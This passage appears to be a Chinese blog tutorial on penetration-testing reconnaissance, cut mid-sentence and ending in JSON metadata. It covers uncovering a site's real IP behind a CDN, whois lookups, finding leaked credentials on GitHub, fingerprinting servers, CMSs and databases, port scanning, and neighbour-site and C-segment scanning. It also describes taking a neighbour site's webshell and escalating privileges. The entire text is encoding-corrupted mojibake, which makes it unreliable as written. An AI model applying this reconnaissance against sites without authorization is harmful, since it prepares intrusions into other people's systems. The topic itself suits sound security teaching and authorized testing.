æƒ¯ï¼Œåªè®©WWWåŸŸåä½¿ç”¨cdnï¼Œç§ƒåŸŸåä¸é€‚ç”¨ï¼Œä¸ºçš„æ˜¯åœ¨ç»´æŠ¤ç½‘ç«™æ—¶æ›´æ–¹ä¾¿ï¼Œä¸ç”¨ç­‰cdnç¼“å­˜ã€‚æ‰€ä»¥è¯•ç€æŠŠç›®æ ‡ç½‘ç«™çš„wwwå»æ‰ï¼Œpingä¸€ä¸‹çœ‹ipæ˜¯ä¸æ˜¯å˜äº†ã€‚ (3)é‚®ä»¶æœåŠ¡å™¨ï¼šä¸€èˆ¬çš„é‚®ä»¶ç³»ç»Ÿéƒ½åœ¨å†…éƒ¨ï¼Œæ²¡æœ‰ç»è¿‡CDNçš„è§£æï¼Œé€šè¿‡ç›®æ ‡ç½‘ç«™ç”¨æˆ·æ³¨å†Œæˆ–è€…RSSè®¢é˜…åŠŸèƒ½ï¼ŒæŸ¥çœ‹é‚®ä»¶ï¼Œå¯»æ‰¾é‚®ä»¶å¤´ä¸­çš„é‚®ä»¶æœåŠ¡å™¨åŸŸåIPï¼Œpingè¿™ä¸ªé‚®ä»¶æœåŠ¡å™¨çš„åŸŸåï¼Œå°±å¯ä»¥è·å¾—ç›®æ ‡çš„çœŸå®IP(å¿…é¡»æ˜¯ç›®æ ‡è‡ªå·±çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œç¬¬ä¸‰æ–¹æˆ–è€…å…¬å…±é‚®ä»¶æœåŠ¡å™¨æ˜¯æ²¡æœ‰ç”¨çš„)ã€‚ (4)æŸ¥çœ‹åŸŸåå†å²è§£æè®°å½•ï¼šä¹Ÿè®¸ç›®æ ‡å¾ˆä¹…ä¹‹å‰æ²¡æœ‰ä½¿ç”¨CDNï¼Œæ‰€ä»¥å¯èƒ½ä¼šå­˜åœ¨ä½¿ç”¨ CDN å‰çš„è®°å½•ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ç½‘ç«™https://www.netcraft.com æ¥è§‚å¯ŸåŸŸåçš„IPå†å²è®°å½•ã€‚ (5)å›½å¤–è®¿é—®ï¼šå›½å†…çš„CDNå¾€å¾€åªå¯¹å›½å†…ç”¨æˆ·çš„è®¿é—®åŠ é€Ÿï¼Œè€Œå›½å¤–çš„CDNå°±ä¸ä¸€å®šäº†ã€‚å› æ­¤ï¼Œé€šè¿‡å›½å¤–åœ¨çº¿ä»£ç†ç½‘ç«™https://asm.ca.com/en/ping.php è®¿é—® ï¼Œå¯èƒ½ä¼šå¾—åˆ°çœŸå®çš„ipåœ°å€ã€‚ (6)NslookupæŸ¥è¯¢ï¼šæŸ¥è¯¢åŸŸåçš„NSè®°å½•ã€MXè®°å½•ã€TXTè®°å½•ç­‰å¾ˆæœ‰å¯èƒ½æŒ‡å‘çš„æ˜¯çœŸå®ipæˆ–åŒCæ®µæœåŠ¡å™¨ã€‚ä¼ é€é—¨ï¼šå„ç§è§£æè®°å½• (7)ç½‘ç«™æ¼æ´ï¼šåˆ©ç”¨ç½‘ç«™è‡ªèº«å­˜åœ¨çš„æ¼æ´ï¼Œå¾ˆå¤šæƒ…å†µä¸‹ä¼šæ³„éœ²æœåŠ¡å™¨çš„çœŸå®IPåœ°å€ (8)CensysæŸ¥è¯¢SSLè¯ä¹¦æ‰¾åˆ°çœŸå®IPï¼šåˆ©ç”¨â€œCensysç½‘ç»œç©ºé—´æœç´¢å¼•æ“â€æœç´¢ç½‘ç«™çš„SSLè¯ä¹¦åŠHASHï¼Œåœ¨https://crt.shä¸ŠæŸ¥æ‰¾ç›®æ ‡ç½‘ç«™SSLè¯ä¹¦çš„HASHï¼Œç„¶åå†ç”¨Censysæœç´¢è¯¥HASHå³å¯å¾—åˆ°çœŸå®IPåœ°å€ã€‚ ç»•è¿‡CDNæŸ¥æ‰¾ç½‘ç«™çœŸå®ipéƒ¨åˆ†ç»“æŸ åŸŸåçš„whoisä¿¡æ¯ï¼šwhoisæ˜¯ç”¨æ¥æŸ¥è¯¢åŸŸåæ³¨å†Œæ‰€æœ‰è€…ç­‰ä¿¡æ¯çš„ä¼ è¾“åè®®ã€‚ç®€å•è¯´ï¼Œwhoiså°±æ˜¯ä¸€ä¸ªç”¨æ¥æŸ¥è¯¢åŸŸåæ˜¯å¦å·²ç»è¢«æ³¨å†Œï¼Œä»¥åŠæ³¨å†ŒåŸŸåçš„è¯¦ç»†ä¿¡æ¯çš„æ•°æ®åº“ï¼ˆå¦‚åŸŸåæ‰€æœ‰äººã€åŸŸåæ³¨å†Œå•†ï¼‰ã€‚é€šè¿‡whoisæ¥å®ç°å¯¹åŸŸåä¿¡æ¯çš„æŸ¥è¯¢ã€‚æ—©æœŸçš„whoisæŸ¥è¯¢å¤šä»¥å‘½ä»¤è¡Œæ¥å£å­˜åœ¨ï¼Œä½†æ˜¯ç°åœ¨å‡ºç°äº†ä¸€äº›ç½‘é¡µæ¥å£ç®€åŒ–çš„çº¿ä¸ŠæŸ¥è¯¢å·¥å…·ï¼Œå¯ä»¥ä¸€æ¬¡å‘ä¸åŒçš„æ•°æ®åº“æŸ¥è¯¢ã€‚ç½‘é¡µæ¥å£çš„æŸ¥è¯¢å·¥å…·ä»ç„¶ä¾èµ–whoisåè®®å‘æœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ï¼Œå‘½ä»¤è¡Œæ¥å£çš„å·¥å…·ä»ç„¶è¢«ç³»ç»Ÿç®¡ç†å‘˜å¹¿æ³›ä½¿ç”¨ã€‚whoisé€šå¸¸ä½¿ç”¨TCPåè®®43ç«¯å£ã€‚æ¯ä¸ªåŸŸå/IPçš„whoisä¿¡æ¯ç”±å¯¹åº”çš„ç®¡ç†æœºæ„ä¿å­˜ã€‚ é€šå¸¸ï¼Œæˆ‘ä»¬è¿›è¡ŒwhoisæŸ¥è¯¢æ˜¯å»ï¼š ç«™é•¿ä¹‹å®¶whoisæŸ¥è¯¢ ã€‚ç„¶åæŸ¥å‡ºæ¥ä¿¡æ¯ä¹‹åï¼Œå¯ä»¥æ ¹æ®æŸ¥è¯¢å‡ºæ¥çš„é‚®ç®±ã€æ³¨å†Œäººã€å…¬å¸ã€ç”µè¯ç­‰è¿›è¡ŒåæŸ¥ã€‚http://whois.chinaz.com #å…¬å¸æ•æ„Ÿä¿¡æ¯ç½‘ä¸Šæœé›† å½“ç¡®å®šäº†å…¬å¸åï¼Œæˆ‘ä»¬å¯ä»¥å»äº’è”ç½‘ä¸ŠæŸ¥è¯¢ä¸è¯¥å…¬å¸æœ‰å…³çš„ä»»ä½•ä¿¡æ¯ã€‚æ¯”å¦‚ï¼Œå…¬å¸çš„é‚®ç®±æ ¼å¼ï¼Œå…¬å¸çš„å‘˜å·¥å§“åï¼Œä»¥åŠä¸è¯¥å…¬å¸æœ‰å…³çš„ä»»ä½•ä¿¡æ¯ã€‚å¹¶ä¸”ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å»Githubã€ç äº‘ç­‰ä»£ç æ‰˜ç®¡å¹³å°ä¸ŠæŸ¥æ‰¾ä¸æ­¤æœ‰å…³çš„æ•æ„Ÿä¿¡æ¯ï¼Œæœ‰äº›ç²—å¿ƒçš„ç¨‹åºå‘˜åœ¨å°†ä»£ç ä¸Šä¼ è‡³ä»£ç æ‰˜ç®¡å¹³å°åï¼Œå¹¶æ²¡æœ‰å¯¹ä»£ç è¿›è¡Œè„±æ•å¤„ç†ã€‚å¯¼è‡´ä¸Šä¼ çš„ä»£ç ä¸­æœ‰åŒ…å«å¦‚æ•°æ®åº“è¿æ¥ä¿¡æ¯ã€é‚®ç®±å¯†ç ã€è¿˜æœ‰å¯èƒ½æœ‰æ³„éœ²çš„æºä»£ç ç­‰ã€‚Githubæœç´¢è¯­æ³•ï¼šhttps://blog.csdn.net/qq_36119192/article/details/99690742 #ç½‘ç«™æŒ‡çº¹è¯†åˆ« åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¯¹ç›®æ ‡æœåŠ¡å™¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«æ˜¯ç›¸å½“æœ‰å¿…è¦çš„ï¼Œå› ä¸ºåªæœ‰è¯†åˆ«å‡ºç›¸åº”çš„Webå®¹å™¨æˆ–è€…CMSï¼Œæ‰èƒ½æŸ¥æ‰¾ä¸å…¶ç›¸å…³çš„æ¼æ´ï¼Œç„¶åæ‰èƒ½è¿›è¡Œç›¸åº”çš„æ¸—é€æ“ä½œã€‚CMSåˆç§°æ•´ç«™ç³»ç»Ÿã€‚å¸¸è§çš„CMSæœ‰ï¼šWordPressã€Dedecmsã€Discuzã€PhpWebã€PhpWindã€Dvbbsã€PhpCMSã€ECShopã€ã€SiteWeaverã€AspCMSã€å¸å›½ã€Z-Blogç­‰ã€‚ å¸¸è§çš„ç½‘ç«™æŒ‡çº¹è¯†åˆ«å·¥å…·æœ‰ï¼šwhatwebç­‰ã€‚ åœ¨çº¿æŒ‡çº¹è¯†åˆ«ç½‘ç«™ï¼š BugScanerï¼šhttp://whatweb.bugscaner.com/look/äº‘æ‚‰æŒ‡çº¹ï¼šhttp://www.yunsee.cn/finger.htmlWhatWebï¼šhttps://whatweb.net/ #æ•´ç«™åˆ†æ æœåŠ¡å™¨ç±»å‹(Linux/Windows) æœåŠ¡å™¨ä¿¡æ¯åŒ…æ‹¬æœåŠ¡å™¨ç”¨çš„æ“ä½œç³»ç»Ÿï¼šLinux è¿˜æ˜¯ Windows ã€‚ç°åœ¨ä¼ä¸šç½‘ç«™æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæœ‰ç™¾åˆ†ä¹‹ä¹åä»¥ä¸Šç”¨çš„æ˜¯Linuxæ“ä½œç³»ç»Ÿã€‚çŸ¥é“äº†æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿä¹‹åï¼Œè¿˜éœ€è¦çŸ¥é“æ“ä½œç³»ç»Ÿä½¿ç”¨çš„å…·ä½“ç‰ˆæœ¬ã€‚å› ä¸ºå¾ˆå¤šä½ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿéƒ½å­˜åœ¨å·²çŸ¥çš„æ¼æ´ã€‚ åˆ¤æ–­æ˜¯Linuxè¿˜æ˜¯Windowsæœ€ç®€å•å°±æ˜¯é€šè¿‡pingæ¥æ¢æµ‹ï¼ŒWindowsçš„TTLå€¼éƒ½æ˜¯ä¸€èˆ¬æ˜¯128ï¼ŒLinuxåˆ™æ˜¯64ã€‚æ‰€ä»¥å¤§äº100çš„è‚¯å®šæ˜¯Windowsï¼Œè€Œå‡ åçš„è‚¯å®šæ˜¯Linuxã€‚ä½†æ˜¯ï¼Œé€šè¿‡TTLå€¼æ¥åˆ¤æ–­æœåŠ¡å™¨ç±»å‹ä¹Ÿä¸æ˜¯ç™¾åˆ†ä¹‹ç™¾å‡†ç¡®çš„ï¼Œæœ‰äº›windowsæœåŠ¡å™¨çš„TTLå€¼ä¹Ÿæ˜¯å‡ åï¼Œè€Œä¸”æœ‰çš„æœåŠ¡å™¨ç¦æ­¢pingã€‚ pingä¸€ä¸‹è‡ªå·±çš„ç½‘ç«™è¯•è¯•ï¼Œç»“æœæ­£ç¡®ã€‚ tipsï¼šçœ‹åˆ°ä¸ªè¯„è®ºä¸çŸ¥é“å¯¹ä¸å¯¹ï¼Œæš‚ä¸”å…ˆè®°ç€ï¼šåˆ†äº«ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„ç®€å•åŒºåˆ«æ–¹å¼ï¼ŒLinuxç³»ç»Ÿå¯¹å¤§å°å†™æ•æ„Ÿï¼ŒWindowsä¸æ•æ„Ÿã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è®¿é—®çš„æ—¶å€™å¯ä»¥å°è¯•æŠŠè·¯å¾„éƒ¨åˆ†æ”¹æˆå¤§å†™ï¼Œç„¶åå»è®¿é—®ï¼Œçœ‹èƒ½å¦è¯·æ±‚æˆåŠŸã€‚Linuxç³»ç»Ÿä¼šæ‰¾ä¸åˆ°æ–‡ä»¶çš„ï¼ŒWindowså¯ä»¥æ‰¾åˆ°ï¼Œå› ä¸ºå¯¹å¤§å°å†™ä¸æ•æ„Ÿ. è€Œåˆ¤æ–­ç›®æ ‡ç½‘ç«™æœåŠ¡å™¨çš„å…·ä½“çš„ç‰ˆæœ¬çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨ nmap è¿›è¡Œæ‰«æï¼Œ -O å’Œ -A å‚æ•°éƒ½èƒ½æ‰«æå‡ºæ¥ ç½‘ç«™å®¹å™¨(Apache/Nginx/Tomcat/IIS) çŸ¥é“äº†è¿™äº›ä¿¡æ¯ä¹‹åï¼Œæˆ‘ä»¬å°±éœ€è¦çŸ¥é“ç½‘ç«™ç”¨çš„webæœåŠ¡å™¨æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼šApacheã€Nginxã€Tomcat è¿˜æ˜¯ IISã€‚çŸ¥é“äº†webæœåŠ¡å™¨æ˜¯å“ªç§ç±»å‹åï¼Œæˆ‘ä»¬è¿˜è¦æ¢æµ‹webæœåŠ¡å™¨å…·ä½“çš„ç‰ˆæœ¬ã€‚æ¯”å¦‚Ngnixç‰ˆæœ¬&lt;0.83ä¼šæœ‰è§£ææ¼æ´ ï¼ŒIIS6.0ä¼šæœ‰æ–‡ä»¶åè§£ææ¼æ´ã€IIS7.0ä¼šæœ‰ç•¸å½¢è§£ææ¼æ´ç­‰ã€‚ä¸åŒçš„webæœåŠ¡å™¨ç‰ˆæœ¬ï¼Œå­˜åœ¨ç€ä¸åŒæ¼æ´ã€‚ è„šæœ¬ç±»å‹(php/jsp/asp/aspx) æˆ‘ä»¬éœ€è¦çŸ¥é“ç½‘ç«™ç”¨çš„è„šæœ¬ç±»å‹ï¼šphp ã€Jsp ã€Asp ã€Aspx ã€‚1ï¼šå¯ä»¥æ ¹æ®ç½‘ç«™URLæ¥åˆ¤æ–­2ï¼šsite:xxx filetype:php3ï¼šå¯ä»¥æ ¹æ®Firefoxçš„æ’ä»¶æ¥åˆ¤æ–­ æ•°æ®åº“ç±»å‹(Mysql/Oracle/Accees/Mqlserver) æˆ‘ä»¬éœ€è¦çŸ¥é“ç½‘ç«™ç”¨çš„æ˜¯å“ªç§ç±»å‹çš„æ•°æ®åº“ï¼šMysqlã€Oracleã€SqlServer è¿˜æ˜¯ Access ã€‚è™½ç„¶è¿™å‡ ç§æ•°æ®åº“çš„è¯­æ³•å¤§ä½“ä¸Šç›¸åŒï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰åŒºåˆ«çš„ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯è¦çŸ¥é“ç›®æ ‡ç½‘ç«™ç”¨çš„æ˜¯å“ªç§æ•°æ®åº“ï¼Œå¹¶ä¸”æ•°æ®åº“æ˜¯å“ªä¸ªç‰ˆæœ¬çš„ å‡ ç§æ•°æ®åº“çš„åŒºåˆ«ï¼š Access å…¨åæ˜¯Microsoft Office Accessï¼Œæ˜¯ç”±å¾®è½¯å‘å¸ƒçš„å…³è”å¼æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚å°å‹æ•°æ®åº“ï¼Œå½“æ•°æ®åº“è¾¾åˆ°100Må·¦å³çš„æ—¶å€™æ€§èƒ½å°±ä¼šä¸‹é™ã€‚æ•°æ®åº“åç¼€åï¼š .mdb ä¸€èˆ¬æ˜¯aspçš„ç½‘é¡µæ–‡ä»¶ç”¨accessæ•°æ®åº“ SQL Serveræ˜¯ç”±Microsoftå¼€å‘å’Œæ¨å¹¿çš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰ï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§å‹çš„æ•°æ®åº“ã€‚ç«¯å£å·ä¸º1433ã€‚æ•°æ®åº“åç¼€å .mdf MySQL æ˜¯ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç”±ç‘å…¸MySQL AB å…¬å¸å¼€å‘ï¼Œç›®å‰å±äº Oracle æ——ä¸‹äº§å“ã€‚MySQLæ˜¯æœ€æµè¡Œçš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œåœ¨ WEB åº”ç”¨æ–¹é¢MySQLæ˜¯æœ€å¥½çš„åº”ç”¨è½¯ä»¶ä¹‹ä¸€ï¼ŒMySQLæ•°æ®åº“å¤§éƒ¨åˆ†æ˜¯phpçš„é¡µé¢ã€‚é»˜è®¤ç«¯å£æ˜¯3306 OracleåˆåOracle RDBMSï¼Œæˆ–ç®€ç§°Oracleã€‚æ˜¯ç”²éª¨æ–‡å…¬å¸çš„ä¸€æ¬¾å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚å¸¸ç”¨äºæ¯”è¾ƒå¤§çš„ç½‘ç«™ã€‚é»˜è®¤ç«¯å£æ˜¯1521 é¦–å…ˆï¼Œæˆæœ¬ä¸Šçš„å·®è·ï¼Œaccessæ˜¯ä¸è¦é’±çš„ï¼Œmysqlä¹Ÿæ˜¯å¼€æºçš„ï¼Œsql server æ˜¯æ”¶è´¹çš„ä¸€èˆ¬ä¹Ÿå°±å‡ åƒï¼ŒOracleçš„è´¹ç”¨åˆ™æ•°ä¸‡ã€‚å…¶æ¬¡ï¼Œå¤„ç†èƒ½åŠ›ï¼Œaccessæ”¯æŒåƒä»¥å†…çš„è®¿é—®é‡ï¼Œsql serveræ”¯æŒå‡ åƒåˆ°ä¸Šä¸‡çš„è®¿é—®ï¼Œè€ŒOracleåˆ™æ”¯æŒæµ·é‡çš„è®¿ é—®ã€‚å†æ¬¡ï¼Œä»æ•°æ®åº“çš„è§„æ¨¡æ¥çœ‹ï¼Œaccessæ˜¯å°å‹æ•°æ®åº“ï¼Œï¼Œmysql æ˜¯ä¸­å°å‹æ•°æ®åº“ï¼Œsql serveræ˜¯ä¸­å‹æ•°æ®åº“ï¼ŒOracleæ˜¯å¤§å‹æ•°æ®åº“ã€‚ å¸¸è§æ­é…ï¼š ASP å’Œ ASPXï¼šACCESSã€SQL Server PHPï¼šMySQLã€PostgreSQL JSPï¼šOracleã€MySQL #ä¸»æœºæ‰«æ(Nessus) å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æï¼Œè€Œä¸ä»…ä»…æ˜¯å¯¹ç½‘ç«™è¿›è¡Œæ‰«æï¼Œæ‰«æç›®æ ‡ä¸»æœºå¼€æ”¾äº†å“ªäº›ç«¯å£ï¼Œæ‰«æç«¯å£è¿è¡Œçš„æœåŠ¡ï¼Œç›®æ ‡ä¸»æœºä¸Šæœ‰å“ªäº›æ¼æ´ã€‚ ä¸»æœºæ‰«æçš„å·¥å…·ä¹Ÿæœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ï¼šNessus #ç«¯å£æ‰«æ(nmap) ä¸Šé¢æ¼”ç¤ºè¿‡äº†ï¼Œè¿™é‡Œå°±è·³è¿‡äº†ã€‚Nmapä½¿ç”¨è¯¦è§£ï¼šhttps://blog.csdn.net/qq_36119192/article/details/82079150å¸¸è§å±é™©ç«¯å£åŠæ¼æ´åˆ©ç”¨ï¼šhttps://blog.csdn.net/qq_36119192/article/details/84781477?ops_request_misc=%7B%22request_id%22%3A%22158176934719725219927367%22%2C%22scm%22%3A%2220140713.130056874..%22%7D&amp;request_id=158176934719725219927367&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task #ç½‘ç«™æ•æ„Ÿç›®å½•å’Œæ–‡ä»¶ä¸çŸ¥é“å¹³æ—¶æ‰“CTFçš„dirsearchèƒ½ä¸èƒ½ç”¨ã€‚ã€‚ã€‚ #æ—ç«™å’ŒCæ®µæ‰«æ æ—ç«™æŒ‡çš„æ˜¯åŒä¸€æœåŠ¡å™¨ä¸Šçš„å…¶ä»–ç½‘ç«™ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæœ‰äº›ç½‘ç«™å¯èƒ½ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“å…¥ä¾µã€‚é‚£ä¹ˆï¼Œå¯ä»¥æŸ¥çœ‹è¯¥ç½‘ç«™æ‰€åœ¨çš„æœåŠ¡å™¨ä¸Šæ˜¯å¦è¿˜æœ‰å…¶ä»–ç½‘ç«™ã€‚å¦‚æœæœ‰å…¶ä»–ç½‘ç«™çš„è¯ï¼Œå¯ä»¥å…ˆæ‹¿ä¸‹å…¶ä»–ç½‘ç«™çš„webshellï¼Œç„¶åå†ææƒæ‹¿åˆ°æœåŠ¡å™¨çš„æƒé™ï¼Œæœ€åå°±è‡ªç„¶å¯ä»¥æ‹¿ä¸‹è¯¥ç½‘ç«™äº†ï¼ å¯¹äºçº¢è“å¯¹æŠ—å’ŒæŠ¤ç½‘ï¼ŒCæ®µæ‰«ææ¯”è¾ƒæœ‰æ„ä¹‰ã€‚å¯¹äºå•ç‹¬ç½‘ç«™çš„æ¸—é€æµ‹è¯•ï¼ŒCæ®µæ‰«ææ„ä¹‰ä¸å¤§ã€‚Cæ®µæŒ‡çš„æ˜¯åŒä¸€å†…ç½‘æ®µå†…çš„å…¶ä»–æœåŠ¡å™¨ï¼Œæ¯ä¸ªIPæœ‰ABCDå››ä¸ªæ®µï¼Œä¸¾ä¸ªä¾‹å­ï¼Œ192.168.0.1ï¼ŒAæ®µå°±æ˜¯192ï¼ŒBæ®µæ˜¯168ï¼ŒCæ®µæ˜¯0ï¼ŒDæ®µæ˜¯1ï¼Œè€ŒCæ®µå—…æ¢çš„æ„æ€å°±æ˜¯æ‹¿ä¸‹å®ƒåŒä¸€Cæ®µä¸­çš„å…¶ä¸­ä¸€å°æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯Dæ®µ1-255ä¸­çš„ä¸€å°æœåŠ¡å™¨ï¼Œç„¶ååˆ©ç”¨å·¥å…·å—…æ¢æ‹¿ä¸‹è¯¥æœåŠ¡å™¨ã€‚ æ—ç«™å’ŒCæ®µåœ¨çº¿æŸ¥è¯¢åœ°å€ï¼š http://www.webscan.cc/https://phpinfo.me/bing.php ç½‘ç«™æ¼æ´æ‰«æ ç½‘ç«™æ¼æ´æ‰«æå°±æ˜¯ç›´æ¥å¯¹ç½‘ç«™è¿›è¡Œæ¼æ´æ¢æµ‹äº†ã€‚ç½‘ç«™æ¼æ´æ‰«æä¹Ÿæœ‰å¾ˆå¤šå·¥å…·ã€‚æ¯”å¦‚ AWVSã€AppScanã€OWASP-ZAPã€nessussç­‰ç­‰ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨æ¼æ‰«å·¥å…·ç›´æ¥å¯¹ç½‘ç«™è¿›è¡Œæ‰«æï¼Œå› ä¸ºä¸€ä¸‹å­æµé‡è¿‡å¤§ï¼Œæœ‰äº›ç½‘ç«™å¯èƒ½ä¼šå´©æºƒã€‚æ‰€ä»¥ä¸€èˆ¬æœ€å¥½ä¸è¦ä½¿ç”¨æ¼æ´æ‰«æå·¥å…·å¯¹ç½‘ç«™è¿›è¡Œæ‰«æã€‚å¹¶ä¸”å¦‚æœæœªç»æˆæƒå°±ç”¨æ¼æ‰«å¯¹ç½‘ç«™è¿›è¡Œæ‰«æè¿˜æ˜¯è¿æ³•çš„ï¼ AWVS:https://blog.csdn.net/qq_36119192/article/details/83187475AppScan:https://blog.csdn.net/qq_36119192/article/details/83187475 ä¸‹ä¸€ç¯‡åšå®¢æ‰¾ä¸ªå°ç½‘ç«™å®æˆ˜ä¸€ä¸‹ä¸Šè¿°çš„å†…å®¹ã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/qq_36119192/article/details/84674109","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]}]}